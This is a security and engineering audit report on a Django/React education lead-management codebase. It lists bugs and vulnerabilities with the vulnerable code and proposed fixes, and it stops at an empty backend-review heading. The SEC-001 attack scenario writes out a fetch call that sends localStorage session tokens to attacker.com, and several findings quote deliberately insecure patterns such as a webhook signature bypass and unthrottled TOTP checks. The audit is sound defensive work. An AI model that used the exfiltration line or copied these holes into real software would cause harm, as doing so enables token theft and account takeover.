# EduLead Kerala — Full Engineering Audit Report

> **Auditor:** Senior Staff Engineer / Security Auditor / SRE / QA Lead  
> **Date:** 2026-05-07  
> **Codebase:** EduLead-main (Django 5.2 backend + React 19 / Vite frontend)  
> **Audit Scope:** Complete — all 90+ source files read directly

---

## 1. Executive Summary

| Dimension | Score | Grade |
|---|---|---|
| Overall Code Quality | 62 / 100 | C+ |
| Production Readiness | 38 / 100 | F |
| Maintainability | 65 / 100 | C+ |
| Scalability | 45 / 100 | D+ |
| Security | 55 / 100 | D+ |
| Technical Debt Level | HIGH | — |

**Verdict:** This codebase is a thoughtfully designed prototype with strong architectural intent but is **not production-ready**. It has 11 critical bugs that will cause data loss or security breaches, 14 high-severity issues, and zero test coverage. Several security controls exist in name but are silently disabled or non-functional at runtime (auth failure tracking, Twilio signature bypass, TOTP brute-force). The infrastructure defaults (SQLite, `ALLOWED_HOSTS=*`, no email notifications) prevent safe deployment without a checklist of fixes.

---

## 2. Architecture Review

### 2.1 Folder Structure

```
EduLead-main/
├── edulead_backend/         Django 5.2 + Channels + Celery
│   ├── apps/               8 Django apps (well-separated)
│   ├── config/             Settings, ASGI, Celery, URLs
│   ├── middleware/         Custom rate-limit, security headers, webhook sig
│   ├── services/           Business logic (AI, billing, comms, compliance, leads)
│   └── tasks/              Celery tasks (ai, billing, leads)
└── artifacts/edulead-frontend/   React 19 + Vite + Tailwind + Zustand
```

**Verdict:** Separation of concerns is good. Service layer, Celery tasks, and Django apps are correctly separated. The frontend is a standard SPA.

### 2.2 Architecture Flaws

| # | Flaw | Severity |
|---|---|---|
| A1 | Voice webhook **blocks a Django/ASGI worker thread for 12 seconds** via `time.sleep()` — kills throughput under load | CRITICAL |
| A2 | No API versioning (`/v1/`). Any breaking change requires coordinated frontend/backend deploy with no rollback | HIGH |
| A3 | SQLite default in settings. A multi-process Celery + Daphne setup **will corrupt SQLite** under concurrent writes | CRITICAL |
| A4 | Redis single-instance, no sentinel/cluster. Redis failure kills auth, rate limiting, conversation history, and voice pipeline simultaneously | HIGH |
| A5 | No background job dashboard (Flower). Failed Celery tasks are silent beyond log lines | MEDIUM |
| A6 | WebSocket JWT passed as a URL query parameter — logged by every proxy | HIGH |
| A7 | Quota management is non-atomic across DB + Redis — see Bug #5 | CRITICAL |
| A8 | No health-check endpoint (`/healthz`, `/readyz`) for load-balancer or Kubernetes | MEDIUM |

---

## 3. Bug Detection

### BUG-001 — `record_auth_failure()` Is Never Called [CRITICAL]

**File:** `middleware/rate_limit.py:140–154`  
**What:** `record_auth_failure()` exists to block IPs after 5 failed logins. It is defined as an instance method on `RateLimitMiddleware` but is **never called anywhere in the codebase**. The progressive blocking (IP blocked for 30 minutes after 5 failures) is completely non-functional.  
**Why it happens:** The rate limit middleware only counts request frequency, not authentication failures. `LoginView` is a thin wrapper over SimpleJWT's `TokenObtainPairView` and never calls back into the middleware.  
**Impact:** An attacker can make unlimited password guesses — brute force is uninhibited.

```python
# CURRENT — record_auth_failure() is never invoked
class LoginView(TokenObtainPairView):
    permission_classes = [AllowAny]
    serializer_class = CustomTokenObtainPairSerializer
    # No failure tracking
```

**Fix:** Override `LoginView.post()` to catch authentication errors and call the middleware:

```python
class LoginView(TokenObtainPairView):
    permission_classes = [AllowAny]
    serializer_class = CustomTokenObtainPairSerializer

    def post(self, request, *args, **kwargs):
        response = super().post(request, *args, **kwargs)
        if response.status_code == 401:
            middleware = RateLimitMiddleware(None)
            ip = middleware._get_client_ip(request)
            middleware.record_auth_failure(ip)
        return response
```

---

### BUG-002 — TOTP 2FA Endpoint Has No Rate Limiting [CRITICAL]

**File:** `apps/users/views.py:267–297` (`TwoFactorVerifyView`)  
**What:** `POST /api/auth/2fa/verify/` accepts a `user_id` and TOTP `code` with `AllowAny` permission and **no brute-force protection**. An attacker with a valid `user_id` can enumerate all 1,000,000 possible 6-digit codes in seconds.  
**Why it happens:** The rate limit middleware only protects `/api/auth/login`. The 2FA verify endpoint is a separate path that was not included.

```python
# CURRENT — no rate limiting, any user_id accepted
class TwoFactorVerifyView(APIView):
    permission_classes = [AllowAny]
    def post(self, request):
        user_id = request.data.get('user_id', '')  # Attacker controls this
        code = request.data.get('code', '').strip()
        user = User.objects.get(id=user_id, is_active=True)
        totp = pyotp.TOTP(user.totp_secret)
        if not totp.verify(code, valid_window=1):  # 1M attempts possible
            return Response({'detail': 'Invalid or expired code.'}, status=400)
```

**Fix:** Add Redis-backed rate limiting to the 2FA verify path in the middleware and return the user_id from login only as a short-lived JWT to prevent enumeration:

```python
# In rate_limit.py _check_rate_limit(), add:
elif path.startswith('/api/auth/2fa/verify'):
    key = f'ratelimit:2fa:{ip}'
    if self._is_limited(key, 5, 300):  # 5 attempts per 5 minutes
        return self._too_many_requests(300)
```

---

### BUG-003 — Twilio Webhook Signature Bypass via Missing Header [CRITICAL]

**File:** `middleware/webhook_signature.py:36–43`  
**What:** If the `X-Twilio-Signature` header is absent, the middleware silently returns `True` (allows the request through). An attacker can inject arbitrary WhatsApp messages, trigger voice flows, and manipulate call records by simply omitting the signature header.

```python
# CURRENT — missing header = allowed
signature = request.META.get('HTTP_X_TWILIO_SIGNATURE', '')
if not signature:
    logger.debug('No Twilio signature header — skipping validation in dev')
    return True  # CRITICAL: this allows unauthenticated access
```

**Fix:** The bypass should only apply when `DEBUG=True` **and** `TWILIO_AUTH_TOKEN` is not set:

```python
signature = request.META.get('HTTP_X_TWILIO_SIGNATURE', '')
if not signature:
    if settings.DEBUG and not settings.TWILIO_AUTH_TOKEN:
        return True  # Dev only, no token configured
    logger.warning(f"Missing Twilio signature on {request.path}")
    return False  # Reject in production
```

---

### BUG-004 — Voice Webhook Blocks ASGI Worker for 12 Seconds [CRITICAL]

**File:** `apps/webhooks/views.py:188–193` (`TwilioVoiceAnswerView.post`)  
**What:** The voice answer webhook synchronously polls Redis in a `for` loop with `time.sleep(1)` for up to 12 iterations while waiting for the Celery task's AI response. This is a synchronous sleep inside a Django view served by Daphne (ASGI). This blocks an async worker for 12 seconds per simultaneous voice call.

```python
# CURRENT — blocking sleep in ASGI context
for _ in range(VOICE_POLL_MAX_WAIT):   # 12 iterations
    time.sleep(VOICE_POLL_INTERVAL)    # 1 second each = 12 seconds max
    ai_text = r.get(response_key)
    if ai_text:
        break
```

**Impact:** With 10 simultaneous voice calls, all ASGI workers are exhausted. WhatsApp messages, API calls, and dashboard requests will time out.  
**Fix:** Either use a `ThreadPoolExecutor` for this synchronous view, or switch to long-polling via a dedicated endpoint that the Twilio SDK retries:

```python
# Option A: Run in thread pool (safe for ASGI)
import asyncio
from concurrent.futures import ThreadPoolExecutor

async def post(self, request):
    loop = asyncio.get_event_loop()
    with ThreadPoolExecutor() as pool:
        ai_text = await loop.run_in_executor(pool, self._poll_redis, response_key)
```

---

### BUG-005 — Non-Atomic Quota Management Allows Over-Allocation [CRITICAL]

**File:** `services/leads/allocation.py:100–111`  
**What:** Quota check and allocation are not atomic. Two concurrent Celery workers can both call `check_quota()` for the same tenant, both get `remaining > 0`, both create `LeadAllocation` records, and both call `tenant.save(update_fields=['used_quota'])` — but because they both read the same `used_quota` before either saves, only `+1` is recorded instead of `+2`. The tenant's quota limit is breached silently.

```python
# CURRENT — race condition
quota = self.check_quota(str(tenant.id))  # Worker A reads: remaining=1
if quota['remaining'] <= 0:
    continue
# Worker B also reads remaining=1 here before A saves
LeadAllocation.objects.create(...)        # Both workers succeed
tenant.used_quota += 1                    # Both read same value
tenant.save(update_fields=['used_quota']) # Last write wins — only +1 recorded
```

Additionally, `r.incr(f'quota:used:{tenant.id}')` writes to a DIFFERENT Redis key (`quota:used:{id}`) than `check_quota()` reads from (`quota:{id}`). The increment **never invalidates the quota cache**.

**Fix:** Use `select_for_update()` on the tenant row and wrap in a transaction, plus invalidate the cache:

```python
from django.db import transaction

with transaction.atomic():
    tenant = Tenant.objects.select_for_update().get(id=tenant.id)
    if tenant.remaining_quota <= 0:
        continue
    LeadAllocation.objects.create(lead=lead, tenant=tenant, ...)
    Tenant.objects.filter(id=tenant.id).update(used_quota=F('used_quota') + 1)
    get_redis().delete(f'quota:{tenant.id}')  # Invalidate cache
```

---

### BUG-006 — `rescore_cold_leads` Query Window Is Wrong [HIGH]

**File:** `tasks/lead_tasks.py:149–154`  
**What:** The task is supposed to re-score cold leads at the 7-day mark. The query reads:

```python
created_at__gte=seven_days_ago,   # >= 7 days ago
created_at__lt=six_days_ago,      # < 6 days ago
```

This selects leads created in a 24-hour window exactly 7 days ago. Any lead created more than 7 days ago is **permanently skipped** — it ages out of the window and never gets rescored.

**Fix:**
```python
cold_leads = Lead.objects.filter(
    category='cold',
    status='new',
    created_at__lte=seven_days_ago,  # All leads older than 7 days
)
```

---

### BUG-007 — `retry_masked_call` Uses `FRONTEND_URL` for Backend Webhook [HIGH]

**File:** `tasks/lead_tasks.py:251–254`  
**What:** When retrying a masked call, the Twilio callback URL is built with `settings.FRONTEND_URL` instead of `settings.BACKEND_URL`:

```python
# CURRENT — wrong URL
url=(
    f'{settings.FRONTEND_URL}'
    f'/api/webhooks/twilio/voice/'
),
```

The frontend is a React SPA and does not handle `/api/webhooks/`. Twilio will receive a 404 HTML response instead of TwiML, causing all retry calls to fail silently.

**Fix:**
```python
url=f'{settings.BACKEND_URL}/api/webhooks/twilio/voice-inbound/',
```

---

### BUG-008 — `decay_lead_scores` Crashes on Null `last_activity_at` [HIGH]

**File:** `tasks/lead_tasks.py:118–122`  
**What:** `last_activity_at` is not declared with `null=True` in the `Lead` model migration, but the ORM filter `last_activity_at__lt=cutoff` may still return leads where the field is unset at the Python level if not explicitly defined. More critically, `(timezone.now() - lead.last_activity_at).days` will raise `TypeError: unsupported operand type(s) for -: 'datetime.datetime' and 'NoneType'` if the field is None.

**Fix:**
```python
stale_leads = Lead.objects.exclude(
    status__in=('expired', 'converted')
).filter(last_activity_at__lt=cutoff, last_activity_at__isnull=False)
```

---

### BUG-009 — GDPR Deletion Not Wrapped in a Transaction [HIGH]

**File:** `services/compliance/gdpr.py:9–41` (`GDPRService.delete_student_data`)  
**What:** GDPR erasure performs multiple database writes without a transaction:

```python
student.save()                              # Step 1
Message.objects.filter(...).delete()        # Step 2
Conversation.objects.filter(...).update(...)# Step 3
AuditLog.objects.create(...)                # Step 4
```

A crash between any two steps leaves a partially anonymized student: for example, the `student` row is anonymized but `Message` records containing PII remain. This is both a GDPR compliance failure and a data integrity bug.

**Fix:**
```python
from django.db import transaction

def delete_student_data(self, student_id: str):
    with transaction.atomic():
        student = Student.objects.select_for_update().get(id=student_id)
        student.phone_encrypted = None
        student.full_name = 'Deleted User'
        # ... rest of anonymization
        student.save()
        Message.objects.filter(conversation__student=student).delete()
        Conversation.objects.filter(student=student).update(status='abandoned')
        AuditLog.objects.create(...)
```

---

### BUG-010 — `rollover_monthly_quotas` Is Not Idempotent [HIGH]

**File:** `tasks/lead_tasks.py:201–215`, `services/leads/allocation.py:165–197`  
**What:** If `rollover_monthly_quotas` runs twice in a month (due to retry, Celery beat duplication, or manual trigger), the second run will:

1. Read `used_quota = 0` (already reset by first run)  
2. Compute `unused = monthly_quota + rollover_out_from_first_run - 0`  
3. Roll over `min(unused, monthly_quota/2)` — which could be 50% of the inflated unused amount  
4. Reset `used_quota = 0` again  

The rollover accumulates incorrectly, eventually giving tenants unlimited quota.

**Fix:** Lock on `QuotaHistory.unique_together(tenant, month)`:

```python
from django.db import transaction

with transaction.atomic():
    _, created = QuotaHistory.objects.get_or_create(
        tenant=tenant, month=last_month,
        defaults={...}
    )
    if not created:
        return  # Already processed this month
```

---

### BUG-011 — XSS Injection via TwiML String in `handle_college_answers` [HIGH]

**File:** `services/communications/masked_calling.py:130–141`  
**What:** The TwiML for bridging the call is built with raw f-string interpolation using phone numbers read directly from Redis:

```python
# CURRENT — raw f-string, no XML escaping
twiml = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<Response>'
    '<Say ...>ബന്ധപ്പെടുന്നു...</Say>'
    f'<Dial callerId="{bridge["virtual_number"]}">'
    f'<Number>{student_phone}</Number>'  # Unescaped
    '</Dial>'
    '</Response>'
)
```

If `student_phone` or `virtual_number` contain XML special characters (`<`, `>`, `"`, `&`), this breaks the TwiML and can corrupt the call. The `_xml_escape()` helper exists in `webhooks/views.py` but is not used here.

**Fix:**
```python
from apps.webhooks.views import _xml_escape

twiml = (
    '<?xml version="1.0" encoding="UTF-8"?><Response>'
    f'<Say language="ml-IN" voice="{MITRA_VOICE}">ബന്ധപ്പെടുന്നു...</Say>'
    f'<Dial callerId="{_xml_escape(bridge["virtual_number"])}">'
    f'<Number>{_xml_escape(student_phone)}</Number>'
    '</Dial></Response>'
)
```

---

### BUG-012 — Admin Lead Create Always Saves Student Even When Unchanged [MEDIUM]

**File:** `apps/leads/views.py:197–203`  
**What:**
```python
student, _ = Student.objects.get_or_create(...)
if not student.full_name:
    student.full_name = data['student_name']
student.save(update_fields=['full_name'])  # Called unconditionally
```

`student.save()` is called even when `student.full_name` was truthy (no change made). This emits an unnecessary `UPDATE` and, more importantly, overwrites the existing `full_name` with the same value — but touches `updated_at`, which can pollute audit timestamps.

**Fix:**
```python
if not student.full_name:
    student.full_name = data['student_name']
    student.save(update_fields=['full_name'])
```

---

### BUG-013 — `LeadScoringService._classify_timeline` Hardcodes 2025 as Current Year [MEDIUM]

**File:** `services/leads/scoring.py:89`  
**What:** The timeline classifier treats `'2025'` as `this_year`:

```python
if any(w in tl for w in ('this year', '2024', '2025', 'now', 'soon', 'immediately')):
    return 'this_year'
```

As of 2026, `2025` should map to `next_year` (or past). This silently mis-scores leads. The hardcoded year must be updated every year or replaced with dynamic logic.

**Fix:**
```python
import datetime
current_year = str(datetime.date.today().year)
next_year = str(datetime.date.today().year + 1)
if any(w in tl for w in ('this year', current_year, 'now', 'soon', 'immediately')):
    return 'this_year'
if any(w in tl for w in ('next year', next_year, 'later')):
    return 'next_year'
```

---

### BUG-014 — GDPR Export Includes WhatsApp Number After Deletion [MEDIUM]

**File:** `services/compliance/gdpr.py:76–77`  
**What:** `export_student_data()` includes `'whatsapp_number': student.whatsapp_number` in the JSON export. However, `delete_student_data()` does **not** clear `student.whatsapp_number` — only `full_name`, `email`, and `phone_encrypted` are anonymized. The primary identifier (WhatsApp number) is retained in perpetuity, which may conflict with GDPR erasure requirements.

**Fix:** In `delete_student_data()`, also clear the WhatsApp number:
```python
student.whatsapp_number = f'deleted_{student.id}'  # Preserve uniqueness constraint
```

---

### BUG-015 — `_classify_completeness` May Crash on Non-String Field Values [MEDIUM]

**File:** `services/leads/scoring.py:97`  
**What:**
```python
filled = sum(1 for f in required_fields if lead_data.get(f, '').strip())
```
If any field value is not a string (e.g., `None`, `int`, or a dict returned by GPT extraction), `.strip()` raises `AttributeError`. The extraction prompt explicitly says "use empty string if missing" but `extract_lead_data()` returns raw GPT JSON which may contain `None` or missing keys.

**Fix:**
```python
filled = sum(1 for f in required_fields if str(lead_data.get(f, '') or '').strip())
```

---

## 4. Security Audit

### SEC-001 — JWT Tokens Stored in `localStorage` (XSS Hijackable) [HIGH]

**File:** `artifacts/edulead-frontend/src/store/authStore.ts:29–59`  
**What:** Zustand `persist` middleware stores both `accessToken` and `refreshToken` in `localStorage` under key `edulead-auth`. Any JavaScript executing in the browser (XSS, malicious npm package, browser extension) can read `localStorage['edulead-auth']` and steal both tokens, including the 30-day refresh token.  
**Severity:** HIGH  
**Attack scenario:** A stored XSS anywhere in the dashboard (e.g., an unescaped lead name) runs `fetch('https://attacker.com?t=' + localStorage['edulead-auth'])` and exfiltrates session tokens.  
**Remediation:** Store tokens in `httpOnly` cookies (cannot be read by JS). The backend already sets `SESSION_COOKIE_HTTPONLY = True` but the JWT tokens bypass this. Use the `TOKEN_SLIDING` feature or a BFF (Backend-for-Frontend) cookie-based pattern.

---

### SEC-002 — JWT Token Exposed in WebSocket URL [HIGH]

**File:** `apps/conversations/consumers.py:113–118`  
**What:** WebSocket authentication passes the JWT access token as a query parameter: `wss://api.edulead.in/ws/leads/{id}/?token=eyJ...`. Query parameters are:
- Logged by web servers, Nginx, and proxies
- Stored in browser history
- Included in `Referer` headers
- Visible in network traces and CDN logs

**Severity:** HIGH  
**Remediation:** Send the token in the first WebSocket message (the "ticket" pattern), validate it in `receive()` before setting `self.user`, and close unauthorized connections after an authentication timeout.

---

### SEC-003 — CORS Allows All Origins in Development Mode [MEDIUM]

**File:** `config/settings.py:199–200`  
**What:**
```python
if DEBUG:
    CORS_ALLOW_ALL_ORIGINS = True
```
If a developer runs `DEBUG=True` on a staging or production server (common mistake), CORS is fully open. Any website can make credentialed requests to the API on behalf of a logged-in user.  
**Remediation:** Always enumerate allowed origins, even in development: `CORS_ALLOWED_ORIGINS = ['http://localhost:3000', 'http://localhost:5173']`.

---

### SEC-004 — CSP `unsafe-inline` Nullifies XSS Protection [HIGH]

**File:** `middleware/security_headers.py`  
**What:** The Content-Security-Policy includes `script-src 'self' 'unsafe-inline'`. The `unsafe-inline` directive allows execution of any inline `<script>` tag or `javascript:` URI, completely defeating the XSS mitigation purpose of CSP.  
**Remediation:** Replace `'unsafe-inline'` with a nonce:
```python
import secrets
nonce = secrets.token_urlsafe(16)
request._csp_nonce = nonce
csp = f"script-src 'self' 'nonce-{nonce}'"
```

---

### SEC-005 — TOTP Secret Returned in API Response [MEDIUM]

**File:** `apps/users/views.py:226–233`  
**What:** The 2FA setup endpoint returns the raw TOTP secret alongside the QR code:
```python
return Response({
    'secret': secret,           # Raw secret unnecessary
    'qr_code': f'data:image/png;base64,{qr_b64}',
    'provisioning_uri': provisioning_uri,
})
```
The raw secret is an alternative to scanning the QR code. Its exposure in the API response means it is stored in browser DevTools network history, potentially in logs, and is accessible to any JavaScript executing in the page.  
**Remediation:** Remove `'secret'` from the response. The provisioning URI and QR code are sufficient.

---

### SEC-006 — Phone Numbers Passed as Plaintext to Celery/Redis [MEDIUM]

**File:** `apps/webhooks/views.py:118–127`  
**What:** `process_whatsapp_message.delay(from_number=from_number, ..., post_data=dict(request.data))` serializes the full Twilio POST body (including the student's phone number) into a Celery task message stored in Redis. WhatsApp phone numbers are PII under GDPR. Redis stores this in plaintext.  
**Remediation:** Strip PII before queuing. Pass only the sanitized fields, or hash/encrypt the phone number in the task payload.

---

### SEC-007 — `ALLOWED_HOSTS=['*']` as Default [MEDIUM]

**File:** `config/settings.py:17`  
**What:**
```python
ALLOWED_HOSTS = env.list('ALLOWED_HOSTS', default=['*'])
```
If `ALLOWED_HOSTS` is not set in the environment, the server accepts HTTP requests for any `Host` header, enabling HTTP Host Header Injection attacks that can be used for password reset poisoning, cache poisoning, and open redirects.  
**Remediation:** Default must be an empty list:
```python
ALLOWED_HOSTS = env.list('ALLOWED_HOSTS', default=[])
```
Django will reject requests with unrecognized Host headers.

---

### SEC-008 — Audit Log Writes Proxy IP Instead of Client IP [MEDIUM]

**File:** `apps/leads/views.py:115`, `apps/leads/views.py:160`  
**What:** Audit log entries use `request.META.get('REMOTE_ADDR')` directly:
```python
AuditLog.objects.create(
    ip_address=request.META.get('REMOTE_ADDR'),  # Always proxy IP
    ...
)
```
When behind a reverse proxy (configured via `TRUSTED_PROXY_COUNT`), `REMOTE_ADDR` is the proxy's IP, not the client's. The rate-limit middleware correctly resolves the real client IP via `_get_client_ip()` but audit logs bypass this.  
**Remediation:** Create a helper and use it consistently:
```python
# In a utils module
def get_client_ip(request) -> str:
    trusted = getattr(settings, 'TRUSTED_PROXY_COUNT', 1)
    xff = request.META.get('HTTP_X_FORWARDED_FOR', '')
    if xff:
        ips = [ip.strip() for ip in xff.split(',')]
        return ips[max(len(ips) - trusted, 0)]
    return request.META.get('REMOTE_ADDR', '')
```

---

### SEC-009 — No Rate Limiting on Team Invite Endpoint [MEDIUM]

**File:** `apps/users/views.py:125–159` (`TeamView.post`)  
**What:** `POST /api/team/` creates a new user and returns a temporary password in the response with no rate limiting. An authenticated `college_admin` could enumerate valid email addresses (the response differs between existing and new emails) and create unbounded numbers of user accounts.  
**Remediation:** Add rate limiting to the team invite endpoint and send the temporary password via email instead of returning it in the API response.

---

### SEC-010 — Temporary Password Returned in API Response [HIGH]

**File:** `apps/users/views.py:153–158`  
**What:** When inviting a team member, the temporary password is returned in the HTTP response body:
```python
return Response({
    'temp_password': temp_password,  # CRITICAL: plaintext in API response
}, status=201)
```
This means the password is stored in browser DevTools network history, proxy logs, and any API monitoring tool. No invitation email is sent; the password only exists in this response.  
**Remediation:** Send the password via email (using Django's `send_mail`) and do not include it in the API response. Return only `{'status': 'invitation_sent'}`.

---

### SEC-011 — `TWILIO_AUTH_TOKEN = ''` Bypasses Webhook Validation [CRITICAL]

**File:** `middleware/webhook_signature.py:26–28`  
**What:**
```python
def _validate_twilio_signature(self, request) -> bool:
    if not settings.TWILIO_AUTH_TOKEN:
        return True  # Empty token = validation disabled
```
If `TWILIO_AUTH_TOKEN` is not set in the environment (the default is `''`), ALL Twilio webhook requests are accepted without any signature validation. An attacker who discovers the webhook URLs can fabricate WhatsApp messages, trigger voice AI conversations, manipulate call records, and exhaust AI API quotas.  
**Remediation:** Fail secure — require the token to be set in production:
```python
if not settings.TWILIO_AUTH_TOKEN:
    if not settings.DEBUG:
        logger.error("TWILIO_AUTH_TOKEN not set in production!")
        return False
    return True  # Dev only
```

---

### SEC-012 — No Input Validation on `contact_email` Update [LOW]

**File:** `apps/users/views.py:188–189`  
**What:** `TenantSettingsView.patch()` saves `contact_email` without validating email format. Django's `EmailField` validates on model creation but `patch()` uses direct field assignment followed by `.save()` without calling `full_clean()`.  
**Remediation:** Use a serializer with `EmailField` validation or call `tenant.full_clean()` before saving.

---

## 5. Performance Review

### PERF-001 — CSV Export Loads All Leads Into Memory [HIGH]

**File:** `apps/leads/views.py:141–165`  
**What:** `export_csv()` fetches the entire queryset:
```python
leads = self.get_queryset()  # No LIMIT — could be 10,000+ rows
```
A premium tenant with thousands of leads will cause the Django worker to load all of them into memory simultaneously, creating both a memory spike and a DoS vector (authenticated attacker triggers repeated exports).  
**Remediation:** Stream the CSV using Django's `StreamingHttpResponse` and `queryset.iterator()`:
```python
def export_generator(qs):
    writer = csv.writer(...)
    yield writer.writerow([...])  # headers
    for lead in qs.iterator(chunk_size=200):
        yield writer.writerow([...])
return StreamingHttpResponse(export_generator(leads), content_type='text/csv')
```

---

### PERF-002 — N+1 Query in Lead Allocation Loop [HIGH]

**File:** `services/leads/allocation.py:56–85`  
**What:** The allocation loop fetches ALL active tenants, then calls `self.check_quota(str(tenant.id))` in a Python loop:
```python
tenants = Tenant.objects.filter(status='active')  # 1 query
for tenant in tenants:
    quota = self.check_quota(str(tenant.id))      # 1 DB query per tenant (cache miss)
```
With 100 active tenants and a cold Redis cache, this is 100 + 1 database queries per lead allocation. Under burst load (many new leads), this fan-out will saturate the database.  
**Remediation:** Bulk-fetch all tenant quotas in one query and cache:
```python
all_quotas = {
    str(t.id): t.remaining_quota 
    for t in Tenant.objects.filter(status='active')
}
```

---

### PERF-003 — Multiple Redundant GPT API Calls Per Voice Turn [HIGH]

**File:** `services/ai/gpt_counsellor.py:117–143`, `tasks/ai_tasks.py:77–118`  
**What:** Per voice turn, the code may call GPT up to 4 times:
1. `counsellor.chat()` — main response
2. `get_next_state()` → `has_sufficient_data()` → `extract_lead_data()` (if no signal keyword)
3. `is_conversation_complete()` → `extract_lead_data()` (if no signal keyword)
4. Potentially `process_completed_conversation` → `extract_lead_data()` again

At ~$0.005 per GPT-4o call, and with GPT calls potentially happening 3–4× per turn, this multiplies AI costs 4× unnecessarily.  
**Remediation:** Cache `extract_lead_data()` per conversation turn and pass the result forward to avoid duplicate extractions.

---

### PERF-004 — Redis Connection Created on Every Middleware Call [MEDIUM]

**File:** `middleware/rate_limit.py:12–13`, `services/leads/allocation.py:15–16`  
**What:** `get_redis()` calls `redis.from_url(settings.REDIS_URL)` on every invocation, creating a new `Redis` client object. While the underlying connection pool is reused, creating the client object on every request is wasteful.  
**Remediation:** Use a module-level singleton with `django_redis` or `redis.ConnectionPool`.

---

### PERF-005 — `decay_lead_scores` Loads All Stale Leads into Memory [MEDIUM]

**File:** `tasks/lead_tasks.py:115–130`  
**What:** `stale_leads = Lead.objects.exclude(...).filter(...)` loads potentially thousands of leads into a Python list, iterates over them one by one, and saves each individually. With 10,000 stale leads this is 10,001 DB round-trips.  
**Remediation:** Use `update()` with `F()` expressions for bulk score decay:
```python
Lead.objects.filter(...).update(
    score=Greatest(0, F('score') - F('days_inactive') * 2)
)
```

---

## 6. Code Quality Review

### CQ-001 — `TeamView` Accepts `college_staff` Role Not in `User.ROLE_CHOICES` [HIGH]

**File:** `apps/users/views.py:134`, `apps/users/models.py:36–43`  
**What:** `TeamView.post()` defaults to `role = 'college_staff'` and includes it in `allowed_roles`, but `User.ROLE_CHOICES` does not contain `'college_staff'` (it has `'college_user'` instead). Django will save this invalid choice without raising an error (Django choices are not enforced at the DB level). This creates users with an undocumented role that will match no permission check.

```python
# views.py - uses 'college_staff'
allowed_roles = ('college_admin', 'college_staff', 'college_user', ...)

# models.py - ROLE_CHOICES has 'college_user' not 'college_staff'
ROLE_CHOICES = [('college_user', 'College User'), ...]
```

**Fix:** Align the allowed roles with `User.ROLE_CHOICES`. Remove `college_staff` from `allowed_roles`.

---

### CQ-002 — `UserManager.create_user` Silently Accepts Empty Password [MEDIUM]

**File:** `apps/users/models.py:9–26`  
**What:**
```python
if password:  # Empty string '' is falsy
    validate_password(password, user)
user.set_password(password)
```
If called with `password=''`, `validate_password()` is skipped and `set_password('')` creates a user with Django's "unusable password" (the account cannot log in but this is a confusing silent failure for callers). The condition should be `if password is not None`.

---

### CQ-003 — Magic Numbers Throughout Lead Scoring and Allocation [MEDIUM]

**Files:** Multiple  
**What:** Raw numbers like `300`, `900`, `3600` (retry delays), `7` (cold lead hold), `90` (lead expiry days), `12` (voice poll max), `1` (voice poll interval) are scattered across files without named constants.

---

### CQ-004 — `send_quota_warning` Only Logs — No Email/Notification Sent [HIGH]

**File:** `tasks/lead_tasks.py:218–227`  
**What:** The quota warning task exists to alert tenants when they reach 80% or 100% of their monthly quota. The implementation only writes a `logger.warning()` line. No email, no webhook, no in-app notification is sent to the college admin. This means quota exhaustion is invisible to the tenant until they notice leads have stopped arriving.

---

### CQ-005 — Dead Code: `college_staff` Role [MEDIUM]

**File:** `apps/users/views.py:134`  
**What:** `college_staff` appears in `allowed_roles` and `User.ROLE_CHOICES` but no permission check ever references it. This is a dead role that adds confusion.

---

### CQ-006 — Inconsistent Error Response Shape [LOW]

**What:** The codebase mixes `{'detail': '...'}` and `{'error': '...'}` response shapes:
- `views.py` returns `{'detail': '...'}`
- `apps/webhooks/views.py:InitiateMaskedCallView` returns `{'error': '...'}`

This breaks frontend error handling that expects a consistent shape.

---

## 7. Frontend Review

### FE-001 — No Loading/Error State for Critical Data Fetches [MEDIUM]

**What:** The dashboard pages use `axios` calls but without consistent loading states. If the API is slow or returns 500, the UI may show empty tables or remain on a spinner indefinitely with no error message to the user.

---

### FE-002 — `BASE_URL` Stripping May Break API Routing [MEDIUM]

**File:** `artifacts/edulead-frontend/src/lib/axios.ts:4`  
**What:**
```typescript
const BASE_URL = import.meta.env.BASE_URL.replace(/\/$/, '');
```
`import.meta.env.BASE_URL` is Vite's base path (e.g., `/` or `/app/`). Stripping the trailing slash then concatenating `/api` may produce paths like `//api` if `BASE_URL` is `/`. This depends on environment configuration and can cause routing breaks.

---

### FE-003 — Role Type Missing `college_user` in Frontend [MEDIUM]

**File:** `artifacts/edulead-frontend/src/store/authStore.ts:5`  
**What:**
```typescript
export type Role = 'superadmin' | 'college_admin' | 'college_staff' | 'agency_admin';
```
`'college_user'` and `'agency_user'` are valid backend roles but absent from the frontend type. Users with these roles will have `role: null` or `role: undefined` in the auth store, breaking permission checks in `AdminRoute.tsx` and `PrivateRoute.tsx`.

---

### FE-004 — No CSRF Token on Non-GET Requests [MEDIUM]

**What:** The axios instance does not attach a CSRF token for state-mutating requests. While the backend uses JWT (which is CSRF-resistant when sent via `Authorization` header), the absence of CSRF tokens means CSRF protection is entirely dependent on the `Authorization` header check. If any endpoint ever accepts cookie-based auth, CSRF vulnerabilities will be introduced silently.

---

### FE-005 — `refreshToken` Not Rotated in Frontend Store After Refresh [MEDIUM]

**File:** `artifacts/edulead-frontend/src/lib/axios.ts:59–65`  
**What:** After a successful token refresh, only `accessToken` is updated:
```typescript
const newToken = response.data.access;
useAuthStore.getState().setAccessToken(newToken);
// refreshToken is NOT updated
```
The backend has `ROTATE_REFRESH_TOKENS = True` and returns a new refresh token on each use. The frontend discards the new refresh token, continuing to use the old one. After the old refresh token is blacklisted (30 days), the user is silently logged out even though they recently refreshed.

**Fix:**
```typescript
const { access, refresh } = response.data;
useAuthStore.getState().setAuth({ ...useAuthStore.getState(), accessToken: access, refreshToken: refresh });
```

---

## 8. Backend Review

### BE-001 — No Database Transaction Wrapping Lead Creation + Scoring + Allocation [HIGH]

**File:** `tasks/ai_tasks.py:153–205` (`process_completed_conversation`)  
**What:** Lead creation, conversation status update, and the Celery task dispatch for scoring all happen sequentially without a transaction. If the DB write for `Lead.objects.create()` succeeds but `score_and_allocate_lead.delay()` fails (Redis unavailable), the lead is orphaned: created but never scored or allocated.

---

### BE-002 — `LeadChatConsumer._forward_to_whatsapp` Is a Database Query Inside an Async Context [MEDIUM]

**File:** `apps/conversations/consumers.py:156–166`  
**What:** `_forward_to_whatsapp` is decorated with `@database_sync_to_async` and called from `receive()`. However, it calls `WhatsAppHandler().send_message()` which makes an HTTP call to the Twilio API. HTTP calls inside `database_sync_to_async` run in a thread pool but still block the thread until Twilio responds (could be 1–5 seconds). This should be delegated to a Celery task.

---

### BE-003 — No Logging Configuration Defined [MEDIUM]

